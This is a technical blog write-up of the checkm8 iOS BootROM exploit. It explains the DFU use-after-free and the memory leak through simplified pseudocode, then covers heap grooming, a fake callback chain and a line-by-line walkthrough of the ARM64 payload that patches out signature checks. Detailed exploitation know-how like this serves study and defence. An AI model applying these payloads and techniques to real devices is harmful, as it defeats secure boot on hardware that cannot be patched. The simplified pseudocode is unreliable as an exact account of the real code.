---
layout: post
title: "Deep Dive into the checkm8 BootROM Exploit"
date: 2025-10-21
excerpt: "A comprehensive technical analysis of the checkm8 exploit, exploring the use-after-free vulnerability and memory leak that enable permanent iOS device jailbreaking on A5-A11 chips."
---

<div class="post-content">

## Table of Contents

- [Introduction](#introduction)
  - [Resources](#resources)
  - [Legal Disclaimer](#legal-disclaimer)
- [USB Initialization](#usb-initialization)
- [USB Transfer Handling](#usb-transfer-handling)
  - [Request Processing](#request-processing)
  - [Data Movement](#data-movement)
- [The Use-After-Free Vulnerability](#the-use-after-free-vulnerability)
  - [Image Processing Flow](#image-processing-flow)
  - [Shutdown Behavior](#shutdown-behavior)
- [The Memory Leak Vulnerability](#the-memory-leak-vulnerability)
  - [Why This Matters](#why-this-matters)
  - [USB Request Structures](#usb-request-structures)
  - [The Bug Location](#the-bug-location)
- [Exploitation Technique](#exploitation-technique)
  - [Heap Grooming](#heap-grooming)
  - [Triggering the Bug](#triggering-the-bug)
  - [Payload Construction](#payload-construction)
  - [Code Execution](#code-execution)
- [Payload Analysis](#payload-analysis)
- [Conclusion](#conclusion)

## Introduction

This writeup documents my journey understanding checkm8, one of the most significant BootROM exploits ever discovered. My goal was to comprehend the exploit deeply enough to build my own implementation from scratch.

The checkm8 exploit chains two distinct vulnerabilities:

1. **Use-after-free bug** (remained in code until the A14 chip)
2. **Memory leak bug** (Apple fixed this starting with A12)

Here's the critical part: you need both bugs working together to make this exploit work. The memory leak isn't just helpful—it's absolutely essential for exploiting the use-after-free bug. This is why A12 and A13 devices, even though they contain the use-after-free vulnerability, cannot be exploited by checkm8. Apple fixed the memory leak, which blocks the entire attack chain.

### Resources

Before diving in, here are the resources that helped me learn:

- [Technical breakdown of checkm8](https://habr.com/en/companies/dsec/articles/472762/) by [a1exdandy](https://twitter.com/a1exdandy)
- [checkra1n implementation slides](https://papers.put.as/papers/ios/2019/LucaPOC.pdf) by [Luca Todesco](https://twitter.com/qwertyoruiopz)
- [Bug writeup](https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4) by [littlelailo](https://twitter.com/littlelailo)
- [checkm8 Q&A](https://medium.com/@deepaknx/a-inquisitive-q-a-on-checkm8-bootrom-exploit-82da0d6f6c)
- [ipwndfu toolkit](https://github.com/axi0mX/ipwndfu) by [axi0mX](https://twitter.com/axi0mX)
- [gaster implementation](https://github.com/0x7FF/gaster) by [0x7FF](https://github.com/0x7FF)
- [securerom.fun](https://securerom.fun) for their BootROM dump collection

### Legal Disclaimer

For legal reasons, all code examples in this writeup come from pseudocode that demonstrates how things work. You can also find these same functions in leaked iBoot/BootROM source code. I've cleaned up these examples by removing extraneous code and renaming variables to make them easier to understand. This includes checks and safety features that don't matter for understanding the core concepts. Function names remain the same as the original code though.

## USB Initialization

The USB system starts through `usb_init()`, which then calls `usb_dfu_init()`. This setup does several important things: it creates a DFU interface to handle USB communications and sets up a global input/output buffer for data transfers.

```c
int usb_dfu_init()
{   
  // Create and clear the global IO buffer
  // 0x800 byte buffer aligned to 0x40 bytes
  io_buffer = memalign(0x800, 0x40);
  bzero(io_buffer, 0x800);

  // Set up global state variables
  completionStatus = -1;
  totalReceived = 0;
  dfuDone = false;

  // Create the USB interface
  // ... //

  return 0;
}
```

What to remember from this:

- The global IO buffer gets created to hold incoming USB data
- `bzero()` fills this whole buffer with zeros for a clean start
- State tracking variables are set to starting values
- A global USB interface is set up and ready

## USB Transfer Handling

### Request Processing

When DFU gets a USB control transfer, the system calls `usb_core_handle_usb_control_receive()`. This function finds the right DFU interface handler and sends it to `handle_interface_request()`. Let's look at what happens when the host sends data to the device:

For download operations (which are really important for understanding this bug), the function gives back one of three possible results:

- **0** means transfer finished successfully
- **-1** means the requested wLength is bigger than the IO buffer can hold
- **wLength value** means device is ready to receive exactly wLength bytes

```c
int handle_interface_request(struct usb_device_request *request, uint8_t **out_buffer)
{
  int ret = -1;

  // Check if this is host to device transfer
  if ((request->bmRequestType & 0x80) == 0)
  {
    switch(request->bRequest)
    {
      case 1: // DFU_DNLOAD
      {
        if(wLength > sizeof(*io_buffer)) {
          return -1;
        }

        *out_buffer = (uint8_t *)io_buffer; // Point to IO buffer
        expecting = wLength;
        ret = wLength;
        break;
      }

      case 4: // DFU_CLR_STATUS
      case 6: // DFU_ABORT
      {
        totalReceived = 0;

        if(!dfuDone) {
          // Update globals to stop DFU
          completionStatus = -1;
          dfuDone = true;
        }

        ret = 0;
        break;
      }
    }
    return ret;
  }
  return -1;
}
```

Pay attention to these important details:

- The `out_buffer` parameter gets updated to point to the global IO buffer
- The function returns wLength (after checking it) to show expected data length

Back in `usb_core_handle_usb_control_receive()`, this return value decides what to do next:

```c
int ret = registeredInterfaces[interfaceNumber]->handleRequest(&setupRequest, &ep0DataPhaseBuffer);

if (ret < 0) {
  // Error: stall the endpoint
  usb_core_stall_endpoint(0, 1, 0);
} else if (ret == 0) {
  // Success: send zero-length packet
  usb_core_send_zlp();
} else {
  // Expecting data: allocate request and queue for receive
  struct usb_device_io_request *req = usb_core_alloc_endpoint_io_request();
  req->endpoint = 0;
  req->io_buffer = ep0DataPhaseBuffer;
  req->io_length = ret;
  req->status = 0;
  req->callback = usb_device_io_request_callback;
  usb_core_receive_endpoint_io_request(req);
}
```

This is where things get interesting. When `ret` is positive (meaning we're expecting data):

1. An `io_request` structure gets allocated
2. It gets populated with transfer details
3. The callback function gets set
4. The request gets queued for receiving data

### Data Movement


When data actually arrives, `usb_core_do_transfer()` handles it. Here's the simplified flow:

```c
void usb_core_do_transfer()
{
  struct usb_device_io_request *req = currentEndpointRequest;
  
  if (req->io_buffer && req->io_length) {
    // Copy data from USB hardware buffer to request buffer
    memcpy(req->io_buffer, usbHardwareBuffer, transferSize);
    
    req->io_buffer += transferSize;
    req->io_length -= transferSize;
  }
  
  if (req->io_length == 0) {
    // Transfer complete, call callback
    req->callback(req);
  }
}
```

The key insight here: the `io_buffer` in the request structure points to the global IO buffer we saw earlier. As data comes in, it gets copied there chunk by chunk.

## The Use-After-Free Vulnerability

### Image Processing Flow

When DFU receives image data, things get interesting. The system processes images through several stages, and this is where our first vulnerability lives. Let's trace the flow:

```c
void usb_device_io_request_callback(struct usb_device_io_request *req)
{
  if (req->status == 0) {
    // Transfer succeeded
    totalReceived += req->io_length;
    
    if (totalReceived >= expectedImageSize) {
      // We have the complete image
      image4_process_image(io_buffer, totalReceived);
    }
  }
  
  // Free the request structure
  free(req);
}
```

Now here's where it gets spicy. When the image processing happens, it validates the image:

```c
int image4_process_image(void *buffer, size_t length)
{
  // Parse and validate image
  int result = image4_validate(buffer, length);
  
  if (result != 0) {
    // Image validation failed - trigger DFU abort
    handle_interface_request(&abortRequest, NULL);
  }
  
  return result;
}
```

Notice what happens on validation failure? It calls `handle_interface_request()` with a DFU abort request. Let's revisit what that does:

```c
case 6: // DFU_ABORT
{
  totalReceived = 0;
  
  if(!dfuDone) {
    completionStatus = -1;
    dfuDone = true;  // This triggers USB stack shutdown!
  }
  
  ret = 0;
  break;
}
```

### Shutdown Behavior

When `dfuDone` gets set to true, the USB stack begins shutdown. This calls `usb_teardown()`, which calls `usb_dfu_teardown()`:

```c
void usb_dfu_teardown()
{
  // Free the global IO buffer
  if (io_buffer) {
    free(io_buffer);
    io_buffer = NULL;
  }
  
  // Process any pending USB requests
  usb_core_complete_endpoint_io();
}
```

Here's the critical bug: **the IO buffer gets freed, but there might still be pending USB requests that reference it!**

Let's trace what `usb_core_complete_endpoint_io()` does:

```c
void usb_core_complete_endpoint_io()
{
  struct usb_device_io_request *req = pendingRequestsHead;
  
  while (req != NULL) {
    struct usb_device_io_request *next = req->next;
    
    // Mark request as failed
    req->status = -1;
    
    // Call the callback
    if (req->callback) {
      req->callback(req);
    }
    
    // Move to next request
    req = next;
  }
  
  pendingRequestsHead = NULL;
}
```

See the problem? If we have a pending request whose `io_buffer` points to the global IO buffer, and that global IO buffer just got freed, we have a **use-after-free**! The callback will be called with a request structure pointing to freed memory.

But wait, there's more. After the callback runs, what happens to the `io_request` structure itself?

```c
void usb_device_io_request_callback(struct usb_device_io_request *req)
{
  // ... process request ...
  
  free(req);  // Free the request structure
}
```

So we have:
1. Global IO buffer freed
2. Pending request's `io_buffer` now points to freed memory (UAF #1)
3. Request structure itself gets freed after callback (UAF #2)

## The Memory Leak Vulnerability

### Why This Matters

Okay, so we have a use-after-free. Great! But there's a problem: we need to know the address of these freed structures to do anything useful with them. This is where the memory leak comes in.

### USB Request Structures

Let's look at the `io_request` structure more carefully:

```c
struct usb_device_io_request {
  uint32_t endpoint;
  void *io_buffer;
  uint32_t io_length;
  uint32_t status;
  void (*callback)(struct usb_device_io_request *);
  struct usb_device_io_request *next;
  // ... other fields ...
};
```

The `next` field is particularly interesting—it creates a linked list of pending requests.

### The Bug Location

The memory leak exists in how DFU handles certain USB requests. Specifically, when processing a `DFU_GET_STATUS` request:

```c
int handle_interface_request(struct usb_device_request *request, uint8_t **out_buffer)
{
  if ((request->bmRequestType & 0x80) != 0) {
    // Device to host transfer
    switch(request->bRequest)
    {
      case 3: // DFU_GET_STATUS
      {
        // Prepare status response
        static uint8_t status[6];
        status[0] = dfuState;
        status[1] = 0; // Timeout
        status[2] = 0;
        status[3] = 0;
        status[4] = dfuStatus;
        status[5] = 0;
        
        *out_buffer = status;
        return 6; // Return 6 bytes
      }
    }
  }
  // ...
}
```

The vulnerability: when the USB stack queues this response, it creates an `io_request` structure. But there's a subtle bug in how these requests are managed. Under certain conditions (specifically, when we stall the endpoint), the request doesn't get properly removed from the pending list.

Here's the flow:

1. Send `DFU_GET_STATUS` request
2. USB stack allocates `io_request` structure
3. Stall the endpoint before the transfer completes
4. Request remains in pending list, but we can trigger another allocation
5. The new allocation might reuse the same memory
6. But the old request is still in the linked list with its `next` pointer intact!

This gives us a memory leak primitive. By carefully crafting a sequence of USB requests, we can leak heap addresses by examining the `next` pointers in these structures.

The exact technique involves:

```c
// Pseudocode for leak primitive
for (int i = 0; i < NUM_LEAKS; i++) {
  // Send DFU_DNLOAD with specific size to allocate io_request
  send_dfu_dnload(LEAK_SIZE);
  
  // Immediately abort to leave request in weird state
  send_dfu_abort();
  
  // Send DFU_GET_STATUS to allocate new request at same address
  uint8_t *leaked_data = send_dfu_getstatus();
  
  // The response now contains heap metadata including next pointer
  uint64_t leaked_address = *(uint64_t*)(leaked_data + NEXT_OFFSET);
}
```

## Exploitation Technique

### Heap Grooming

Now that we understand both vulnerabilities, let's see how they're exploited together. The attack proceeds in several phases:

**Phase 1: Leak Heap Addresses**

Using the memory leak, we determine the addresses of:
- Allocated `io_request` structures
- The global IO buffer
- USB stack structures

**Phase 2: Heap Grooming**

We carefully manipulate the heap to create a specific layout:

```
[io_request_1][io_request_2][io_buffer][io_request_3][our_payload]
```

This is done by sending a sequence of USB requests that allocate and free structures in a specific pattern:

```c
// Simplified heap grooming
void groom_heap() {
  // Fill holes in heap with known-size allocations
  for (int i = 0; i < NUM_SPRAY; i++) {
    send_dfu_dnload(SPRAY_SIZE);
  }
  
  // Create gaps where we want our structures
  for (int i = 0; i < NUM_GAPS; i++) {
    send_dfu_abort(); // Frees some structures
  }
  
  // Allocate our payload at predictable location
  send_dfu_dnload_with_payload(PAYLOAD_SIZE, payload_data);
}
```

### Triggering the Bug

With the heap groomed, we trigger the use-after-free:

1. Send a large DFU_DNLOAD that will take multiple USB transfers
2. While transfers are pending, send an invalid image
3. Image validation fails, triggers DFU abort
4. Global IO buffer gets freed
5. USB stack processes pending requests
6. Pending requests still reference freed IO buffer
7. We can control what's allocated in that freed space

### Payload Construction

The payload needs to accomplish several things:

**Part 1: Fake USB Request Structure**

We construct a fake `io_request` structure in our payload:

```c
struct fake_io_request {
  uint32_t endpoint;           // 0
  void *io_buffer;             // Points to our shellcode
  uint32_t io_length;          // Size of shellcode
  uint32_t status;             // 0
  void (*callback)(void*);     // Points to nop gadget
  struct io_request *next;     // Points to next fake request
  // ... padding ...
};
```

The key insight: when the USB stack processes this "request", it will:
1. Call the callback (our nop gadget)
2. Follow the `next` pointer to our next fake request
3. Eventually reach our shellcode

**Part 2: The NOP Gadget**

The "nop gadget" isn't actually a nop—it's code that exists in the BootROM that does this:

```asm
ldp x29, x30, [sp, #0x10]  ; Restore frame pointer and link register
ldp x20, x19, [sp], #0x20  ; Restore other registers and fix stack
ret                         ; Return
```

Why is this useful? When our fake callback runs, we want to:
1. Restore legitimate-looking register state
2. Return cleanly without crashing
3. Skip the part that frees our fake structure

By pointing the callback to this gadget, we can manipulate the return address (link register) to jump to our shellcode instead of continuing normal execution.

**Part 3: Callback Chain**


We create a chain of fake `io_request` structures, each with its callback pointing to the nop gadget, and the `next` pointer forming a chain:

```
fake_req_1 -> fake_req_2 -> fake_req_3 -> shellcode_entry
```

When the USB stack processes these:
1. Processes fake_req_1, calls nop gadget, follows next pointer
2. Processes fake_req_2, calls nop gadget, follows next pointer
3. Processes fake_req_3, calls nop gadget, follows next pointer
4. Reaches our shellcode and begins execution!

### Code Execution

When exploiting checkm8, overwriting the callback function lets us restore the link and frame pointer (FP) registers, preventing the current USB request from being freed. Since we've overwritten heap data, attempting to free the object would cause invalid heap metadata corruption, leading to crashes.

For context: the link register (LR) holds the return address after function completion. The frame pointer (FP) holds the current stack frame's address:

```
Top of Stack
|  Return Address |
|  Arguments      |
| Local Variables |
| Saved Registers |
|  Frame Pointer  |
Bottom of Stack
```

The stack frame is the currently active stack region, changing as functions are called or return. It holds local variables, return address, and other critical program data.

But why restore these registers? When the USB stack shuts down, it processes pending requests and `usb_core_complete_endpoint_io()` executes each callback. After executing callbacks, this function frees the IO request object. By restoring link and FP registers, we can return to the function that called `usb_core_complete_endpoint_io()`, bypassing the free operation.

Since `callback` points to memory, we can't directly overwrite it with machine code. This is where the **nop gadget** comes in. The gadget in BootROM code is:

```asm
ldp x29, x30, [sp, #0x10]
ldp x20, x19, [sp], #0x20
ret
```

For context, `x29` is the frame pointer, `x30` is the link register. ARM64 stacks typically grow downward from high to low addresses, with the stack pointer (SP) holding the lowest stack address.

Breaking down `ldp x29, x30, [sp, #0x10]`:

- `ldp` is the load pair instruction
- `x29, x30` are the registers to load
- `[sp, #0x10]` is the source address. `sp` is the stack pointer, `#0x10` is the offset. Since stacks grow downward, adding `0x10` points above the stack pointer where link and FP registers are stored. `0x10` is the combined register pair size (16 bytes, since each 64-bit register is 8 bytes)

`ldp x20, x19, [sp], #0x20` loads registers from the stack pointer without offset, then adds `0x20` (32 bytes) to the stack pointer for alignment.

Finally, `ret` returns to the address stored in the link register.

With the payload in place and an `io_request` with its `next` field pointing into our payload, we trigger a USB reset. This processes the list of pending requests (created while stalled) as failed and executes each callback.

When reaching our overflown `io_request` object, it executes the callback (nop gadget restoring link and FP registers) then follows the `next` field into our payload. It attempts to execute the `callback` field of what it believes is an `io_request` object, but actually begins running our callback chain at the address we overflowed `next` with plus the `callback` field offset in the `io_request` structure (`0x20`).

## Payload Analysis

While ARM64 assembly may seem intimidating, it becomes clear once you understand each instruction. Here's the `_main` function from the main checkm8 payload for T8011:

```asm
_main:
  stp x29, x30, [sp, #-0x10]!
  ldr x0, =payload_dest
  ldr x2, =dfu_handle_bus_reset
  str xzr, [x2]
  ldr x2, =dfu_handle_request
  add x1, x0, #0xC
  str x1, [x2]
  adr x1, _main
  ldr x2, =payload_off
  add x1, x1, x2
  ldr x2, =payload_sz
  ldr x3, =memcpy_addr
  blr x3
  ldr x0, =gUSBSerialNumber
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
  adr x1, PWND_STR
  ldp x2, x3, [x1]
  stp x2, x3, [x0]
  ldr x0, =gUSBSerialNumber
  ldr x1, =usb_create_string_descriptor
  blr x1
  ldr x1, =usb_serial_number_string_descriptor
  strb w0, [x1]
  mov w0, #0xD2800000
  ldr x1, =patch_addr
  str w0, [x1]
  ldp x29, x30, [sp], #0x10
  ret

PWND_STR:
.asciz " PWND:[checkm8]"
```

Let's break this down instruction by instruction:

The first line stores the new link register and frame pointer, standard procedure when branching to a new function:

```asm
stp x29, x30, [sp, #-0x10]!
```

After this, the real payload begins:

```asm
ldr x0, =payload_dest
ldr x2, =dfu_handle_bus_reset
str xzr, [x2]
```

This loads the payload destination address into `x0`, and the `dfu_handle_bus_reset` address into `x2`. `dfu_handle_bus_reset` is the `handle_bus_reset` property of the USB interface created during DFU initialization—simply a pointer to the `handle_bus_reset()` function. The `xzr` register value (zero register) is stored at the `dfu_handle_bus_reset` address to prevent the device from responding to USB reset and triggering USB stack shutdown again, which would cause issues due to heap state and our use of allocated `io_request` structures.

```asm
ldr x2, =dfu_handle_request
add x1, x0, #0xC
str x1, [x2]
```

This loads the `dfu_handle_request` address (the interface's `handle_request` field) into `x2`, adds `0xC` to `x0` (the payload destination) storing the result in `x1`, then stores `x1` at the address in `x2` (`dfu_handle_request`). When `interface->handle_request()` is called, it now jumps to shellcode inside `payload_handle_checkm8_request.S`, which is gaster-specific. **TL;DR**: it replaces the DFU interface's `handle_request()` function with a custom one that does something different when a specific USB request is sent (`0xA1, 2`). If this specific request isn't used, the replacement shellcode just calls the standard `handle_interface_request()` function.

```asm
adr x1, _main
ldr x2, =payload_off
add x1, x1, x2
ldr x2, =payload_sz
ldr x3, =memcpy_addr
blr x3
```

This loads the address of `_main` relative to the program counter into `x1`, and the payload end address into `x2`. By adding them and storing in `x1`, we calculate the address that is `payload_off` bytes from `_main`. The `payload_sz` variable loads into `x2` and the `memcpy()` function address into `x3`. Finally, `blr x3` branches to the address in `x3` with the link register linking back to `_main`, executing `memcpy()`.

The `memcpy()` parameters are: `memcpy(void *dst, void *src, size_t n)`. So the payload destination address is in `x0`, the payload address in `x1`, and payload size in `x2`. The `memcpy()` call copies the payload to the payload destination.

```asm
ldr x0, =gUSBSerialNumber
```

After returning from `memcpy()`, the `gUSBSerialNumber` (global USB serial number) address loads into `x0` as the payload destination is no longer needed.

```asm
_find_zero_loop:
  add x0, x0, #1
  ldrb w1, [x0]
  cbnz w1, _find_zero_loop
```

This loop adds 1 to the address in `x0` (`gUSBSerialNumber`) and loads the byte at that address into `w1`. If the byte isn't zero, it branches back to `_find_zero_loop` and continues. This continues until the byte at the address in `x0` is zero, then continues to the next instruction. It finds the serial number string's end in memory to add `PWND:[checkm8]` to it.

```asm
adr x1, PWND_STR
ldp x2, x3, [x1]
stp x2, x3, [x0]
```

`PWND_STR` loads into `x1`, then the register pair `x2` and `x3` load from the address in `x1`. These store to the address in `x0`, the serial number string's end. This adds `PWND:[checkm8]` to the serial number string.

```asm
ldr x0, =gUSBSerialNumber
ldr x1, =usb_create_string_descriptor
blr x1
```

The `gUSBSerialNumber` start address loads into `x0` again, and the `usb_create_string_descriptor()` function address into `x1`. By branching with a link to register `x1`, the device creates a new string descriptor using the serial number so it appears to the host computer with the custom serial number string.

```asm
ldr x1, =usb_serial_number_string_descriptor
strb w0, [x1]
```

The `usb_serial_number_string_descriptor` updates with the new serial number string to reflect the payload's changes.

```asm
mov w0, #0xD2800000
ldr x1, =patch_addr
str w0, [x1]
```

A value of `0xD2800000` loads into `w0`, which decodes to the instruction `mov x0, 0`. The value in `patch_addr` loads into `x1`, and `0xD2800000` writes to memory at the address pointed to by `patch_addr`. The reason: `patch_addr` points to an instruction inside `image4_validate_property_callback()`, replacing it. So if an image is found improperly signed, instead of branching to a function rejecting it, `mov x0, 0` sets the return value to 0, making the device think it's a validly signed image. This is the signature check patch enabling untrusted image booting.

```asm
ldp x29, x30, [sp], #0x10
ret
```

Finally, we restore the original frame pointer and link register from the stack, and return cleanly from our payload.

## Conclusion

The checkm8 exploit represents a masterclass in vulnerability chaining and exploitation technique. By combining a use-after-free with a memory leak, it achieves arbitrary code execution in one of the most hardened environments in consumer electronics.

The exploit's permanence—residing in immutable BootROM—makes it particularly significant. Apple cannot patch affected devices (A5-A11) via software updates, fundamentally changing the iOS security landscape for these devices.

Understanding checkm8 provides valuable insights into:
- Low-level exploitation techniques
- ARM64 architecture and assembly
- USB protocol intricacies
- Heap manipulation and memory management
- The importance of defense-in-depth security

It demonstrates how seemingly minor bugs, when properly chained together, can compromise even the most security-focused systems. This is why modern exploitation is less about finding a single catastrophic bug and more about finding creative ways to chain multiple smaller issues.

And that's it, I really hope you enjoy this deep dive into this expliot as much as I have. I remember how excited I was back in high school when it was released. 

</div>
